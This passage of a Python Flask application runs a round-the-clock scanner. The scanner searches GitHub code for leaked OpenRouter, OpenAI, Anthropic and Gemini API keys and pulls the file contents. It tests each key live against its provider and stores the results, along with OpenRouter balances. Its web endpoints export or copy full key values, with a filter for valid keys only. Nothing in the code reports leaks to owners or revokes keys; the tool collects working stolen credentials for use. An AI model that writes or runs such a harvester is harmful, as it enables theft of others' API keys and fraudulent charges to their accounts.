                    final_query = f"{query} sort:{random_sort} {time_filter}"
                else:
                    final_query = f"{query} sort:{random_sort}"

                logging.info(f"📊 Query {query_index}/{len(queries)}: {final_query}")

                # Example的搜索逻辑
                max_results = _get_setting('max_results_per_query', 1000)
                search_result = searcher.search_for_keys(final_query, max_results)
                if not search_result:
                    logging.warning(f"⚠️ Search failed: {query}")
                    continue
                
                items = search_result.get('items', [])
                if not items:
                    logging.info(f"📭 No items: {query}")
                    continue

                query_scanned = 0
                query_keys = 0
                query_skipped = 0

                # 仓库级别去重 - 按仓库分组处理
                repos_in_query = {}
                for item in items:
                    repo_name = item["repository"]["full_name"]
                    if repo_name not in repos_in_query:
                        repos_in_query[repo_name] = []
                    repos_in_query[repo_name].append(item)

                logging.info(f"🏢 Found {len(repos_in_query)} unique repositories in this query")

                # Example的仓库处理循环
                for repo_name, repo_items in repos_in_query.items():
                    # 检查仓库是否已经扫描过
                    repo_already_scanned, (file_count, key_count) = is_repo_already_scanned(repo_name)
                    if repo_already_scanned:
                        logging.info(f"⏭️ Skipping already scanned repo: {repo_name} ({file_count} files, {key_count} keys)")
                        query_skipped += len(repo_items)
                        continue

                    logging.info(f"🔍 Scanning new repo: {repo_name} ({len(repo_items)} files)")
                    repo_file_count = 0
                    repo_key_count = 0

                    # 处理仓库中的每个文件
                    for item_index, item in enumerate(repo_items, 1):
                        # 跳过检查
                        should_skip, skip_reason = should_skip_item(item)
                        if should_skip:
                            query_skipped += 1
                            continue

                        # 添加到已扫描SHA（临时缓存）
                        sha = item.get("sha")
                        file_path = item["path"]
                        scanned_shas.add(sha)

                        # 标记文件为已扫描（持久化）
                        mark_file_as_scanned(sha, repo_name, file_path)
                        logging.debug(f"📝 Marked file as scanned: {repo_name}/{file_path}")

                        # 获取文件内容
                        content = searcher.get_file_content(item)
                        if not content:
                            continue

                        # 更新计数器
                        query_scanned += 1
                        scanner_status['scanned_count'] += 1
                        repo_file_count += 1

                        # Example的密钥提取和过滤
                        keys = extract_and_filter_keys(content)
                        if keys:
                            file_path = item["path"]

                            logging.info(f"🔑 Found {len(keys)} keys in {repo_name}/{file_path}")

                            new_keys_count = 0
                            for key_type, key_value in keys:
                                # 保存到数据库，检查是否为新key
                                is_new = _save_key(key_value, key_type)

                                if is_new:
                                    new_keys_count += 1
                                    repo_key_count += 1

                                # 验证密钥（简化版）
                                try:
                                    validation_result = validate_key_once(key_value, key_type)
                                    _update_key_status(key_value, validation_result, key_type)

                                    if validation_result == 200:
                                        query_keys += 1
                                        scanner_status['keys_found_session'] += 1
                                        logging.info(f"✅ Valid {key_type}: {key_value[:20]}...")
                                    elif validation_result == 429:
                                        logging.warning(f"⚠️ Rate limited {key_type}: {key_value[:20]}...")
                                    else:
                                        logging.info(f"❌ Invalid {key_type}: {key_value[:20]}...")
                                except Exception as e:
                                    logging.error(f"Validation error: {str(e)[:30]}")

                        # 统计新key
                        if new_keys_count > 0:
                            logging.info(f"💾 Saved {new_keys_count} NEW keys (out of {len(keys)} found)")
                        else:
                            logging.info(f"🔄 All {len(keys)} keys were duplicates")

                        # 平衡的延迟控制 - 既稳定又不太慢
                        time.sleep(random.uniform(1.5, 3))

                    # 标记仓库为已扫描
                    mark_repo_as_scanned(repo_name, repo_file_count, repo_key_count)
                    logging.info(f"✅ Repo {repo_name} complete: {repo_file_count} files, {repo_key_count} new keys")

                logging.info(f"✅ Query {query_index} complete: scanned={query_scanned}, keys={query_keys}, skipped={query_skipped}, SHA_cache={len(scanned_shas)}")

                # 如果这个查询的重复率太高，记录下来
                if query_scanned > 0:
                    duplicate_rate = query_skipped / query_scanned
                    if duplicate_rate > 0.8:  # 80%以上都是重复的
                        logging.warning(f"⚠️ High duplicate rate ({duplicate_rate:.1%}) for query: {final_query[:50]}...")

                # 11个token保守配置：查询间延迟5-8秒，确保稳定
                time.sleep(random.uniform(5, 8))
            
            # 扫描周期结束
            scanner_status['is_running'] = False
            scanner_status['last_scan_end'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            scanner_status['current_query'] = None
            
            logging.info(f"🏁 Cycle complete: scanned={scanner_status['scanned_count']}, keys={scanner_status['keys_found_session']}")
            
            # 24*7运行的SHA缓存管理 - 保持更大缓存提高去重效率
            if len(scanned_shas) > 50000:  # 增大缓存限制
                # 保留最近的30000个SHA，提供更好的去重效果
                scanned_shas = set(list(scanned_shas)[-30000:])
                logging.info(f"🗑️ SHA cache cleaned: kept 30K recent SHAs")
            
            # 检查手动扫描请求
            if manual_scan_requested:
                manual_scan_requested = False
                logging.info("🔄 Manual scan requested, starting immediately...")
                continue
            
            # 24*7运行模式 - 使用配置的扫描间隔
            scan_interval = _get_setting('scan_interval', 15)  # 默认15秒
            logging.info(f"😴 Cycle complete. Next cycle in {scan_interval} seconds...")
            time.sleep(scan_interval)
            
        except KeyboardInterrupt:
            logging.info("⛔ Scanner interrupted")
            break
        except Exception as e:
            logging.error(f"💥 Scanner error: {str(e)}")
            time.sleep(5)
            continue



# 启动后台扫描线程
threading.Thread(target=scanner_loop, daemon=True).start()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/keys_grouped')
def api_keys_grouped():
    # 读库组装
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT key_value, key_type, status, found_at, last_checked, balance FROM keys ORDER BY found_at DESC")
    grouped = { 'openrouter':[], 'openai':[], 'anthropic':[], 'gemini':[] }
    for row in c.fetchall():
        k = {
            'key': row[0],
            'type': row[1],
            'status': row[2],
            'found_at': row[3],
            'last_checked': row[4],
            'balance': row[5],
            'key_display': (row[0][:15] + '...' + row[0][-5:]) if row[0] and len(row[0])>20 else row[0]
        }
        t = (row[1] or '').lower()
        grouped.setdefault(t, []).append(k)
    conn.close()
    return jsonify(grouped)

@app.route('/api/keys')
def api_keys():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT key_value, key_type, status, found_at, last_checked, balance FROM keys ORDER BY found_at DESC")
    keys = []
    for row in c.fetchall():
        keys.append({
            'key': row[0],
            'type': row[1], 
            'status': row[2],
            'found_at': row[3],
            'last_checked': row[4],
            'balance': row[5]
        })
    conn.close()
    return jsonify(keys)

@app.route('/api/stats')
def api_stats():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    
    # by_type - 所有密钥按类型统计
    c.execute("SELECT key_type, COUNT(*) FROM keys GROUP BY key_type")
    by_type = { (r[0] or 'unknown').lower(): r[1] for r in c.fetchall() }
    
    # by_status - 所有密钥按状态统计
    c.execute("SELECT status, COUNT(*) FROM keys GROUP BY status")
    by_status = {}
    for status, count in c.fetchall():
        status_key = str(status) if status is not None else 'unknown'
        by_status[status_key] = count
    
    # 计算有效密钥总数 (状态为200的所有类型)
    total_valid = by_status.get('200', 0)
    total_429 = by_status.get('429', 0)
    total_forbidden = by_status.get('403', 0)
    
    # openrouter usage（以 balance 汇总）
    c.execute("SELECT SUM(COALESCE(balance,0)) FROM keys WHERE key_type='openrouter'")
    or_usage = c.fetchone()[0] or 0
    
    # trends 最近24小时 - 修改为通用统计而不只是gemini
    c.execute("SELECT bucket, total, gemini_valid, gemini_429 FROM metrics_minutely")
    rows = c.fetchall()
    conn.close()
    
    from collections import OrderedDict
    trend_total = OrderedDict(); trend_valid = OrderedDict(); trend_429 = OrderedDict()
    now = datetime.now(); keys = [ (now - timedelta(minutes=i)).strftime('%Y-%m-%d %H:%M') for i in range(24*60) ]
    for k in reversed(keys):
        trend_total[k] = 0; trend_valid[k]=0; trend_429[k]=0
    for b, t, v, r429 in rows:
        if b in trend_total:
            trend_total[b] = t; trend_valid[b] = v; trend_429[b] = r429
    
    return jsonify({
        'by_type': by_type,
        'by_status': by_status,
        'total_valid': total_valid,
        'total_429': total_429,
        'total_forbidden': total_forbidden,
        'openrouter_usage_total': or_usage,
        'trend_total': trend_total,
        'trend_valid': trend_valid,  # 保持兼容性，但实际是gemini数据
        'trend_429': trend_429,      # 保持兼容性，但实际是gemini数据
    })

@app.route('/api/keys/export/<provider>')
@app.route('/api/keys/export/<provider>/<status>')
def api_export_keys(provider, status=None):
    """Export keys as text file with optional status filter"""
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    
    # Build query based on provider and status
    if provider == 'all':
        if status:
            if status == 'other':
                c.execute("SELECT key_value, key_type FROM keys WHERE status NOT IN ('200', '403', '429') ORDER BY key_type, found_at DESC")
            else:
                c.execute("SELECT key_value, key_type FROM keys WHERE status=? ORDER BY key_type, found_at DESC", (status,))
        else:
            c.execute("SELECT key_value, key_type FROM keys ORDER BY key_type, found_at DESC")
    elif provider == 'valid':
        c.execute("SELECT key_value, key_type FROM keys WHERE status='200' ORDER BY key_type, found_at DESC")
    else:
        if status:
            if status == 'other':
                c.execute("SELECT key_value, key_type FROM keys WHERE key_type=? AND status NOT IN ('200', '403', '429') ORDER BY found_at DESC", (provider,))
            else:
                c.execute("SELECT key_value, key_type FROM keys WHERE key_type=? AND status=? ORDER BY found_at DESC", (provider, status))
        else:
            c.execute("SELECT key_value, key_type FROM keys WHERE key_type=? ORDER BY found_at DESC", (provider,))
    
    rows = c.fetchall()
    conn.close()
    
    # Format as text - only keys, no status
    lines = []
    current_type = None
    
    for key, key_type in rows:
        if key_type != current_type:
            if lines:
                lines.append("")  # Empty line between types
            lines.append(f"# {(key_type or 'unknown').upper()} KEYS")
            lines.append("=" * 50)
            current_type = key_type
        
        # Only add the key value, no status
        lines.append(key)
    
    content = "\n".join(lines)
    
    # Return as downloadable text file
    from flask import Response
    response = Response(content, mimetype='text/plain')
    
    # Include status in filename if filtered
    status_part = f"_{status}" if status else ""
    filename = f"keys_{provider}{status_part}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    response.headers['Content-Disposition'] = f'attachment; filename="{filename}"'
    return response

@app.route('/api/keys/copy/<provider>')
def api_copy_keys(provider):
    """Get keys for copying (returns full keys in JSON)"""
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    
    # Get keys for specific provider or all
    if provider == 'all':
        c.execute("SELECT key_value, key_type, status FROM keys ORDER BY key_type, found_at DESC")
    elif provider == 'valid':
        c.execute("SELECT key_value, key_type, status FROM keys WHERE status='200' ORDER BY key_type, found_at DESC")
    else:
        c.execute("SELECT key_value, key_type, status FROM keys WHERE key_type=? ORDER BY found_at DESC", (provider,))
    
    rows = c.fetchall()
    conn.close()
    
    # Group by type
    grouped = {}
    for key, key_type, status in rows:
        type_name = (key_type or 'unknown').lower()
        if type_name not in grouped:
            grouped[type_name] = []
        grouped[type_name].append({
            'key': key,
            'status': status
        })
    
    return jsonify({
        'keys': grouped,
        'total': len(rows)
    })

@app.route('/api/scanner/status')
def api_scanner_status():
    """Get current scanner status"""
    return jsonify({
        'is_running': scanner_status['is_running'],
        'last_scan_start': scanner_status['last_scan_start'],
        'last_scan_end': scanner_status['last_scan_end'],
        'current_query': scanner_status['current_query'],
        'scanned_count': scanner_status['scanned_count'],
        'keys_found_session': scanner_status['keys_found_session'],
        'errors': scanner_status['errors'][-10:],  # Last 10 errors
        'github_tokens_configured': len(_get_setting('github_tokens', [])) > 0,
        'scan_interval': _get_setting('scan_interval', 60)
    })

@app.route('/api/scanner/trigger', methods=['POST'])
def api_scanner_trigger():
    """Manually trigger a scan (admin only)"""
    if not session.get('is_admin'):
        return jsonify({'status':'unauthorized'}), 401
    
    # Set a flag to trigger immediate scan
    global manual_scan_requested
    manual_scan_requested = True
    return jsonify({'status': 'scan triggered'})

@app.route('/api/refresh-openrouter-balance', methods=['POST'])
def api_refresh_openrouter_balance():
    """手动刷新OpenRouter余额"""
    try:
        refresh_openrouter_balance()
        return jsonify({'success': True, 'message': 'OpenRouter余额已刷新'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/admin/login', methods=['POST'])
def api_admin_login():
    data = request.get_json(force=True, silent=True) or {}
    pwd = (data.get('password') or '').strip()
    if pwd == ADMIN_PASSWORD:
        session['is_admin'] = True
        return jsonify({'ok': True})
    return jsonify({'ok': False}), 401

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=4567, debug=True)

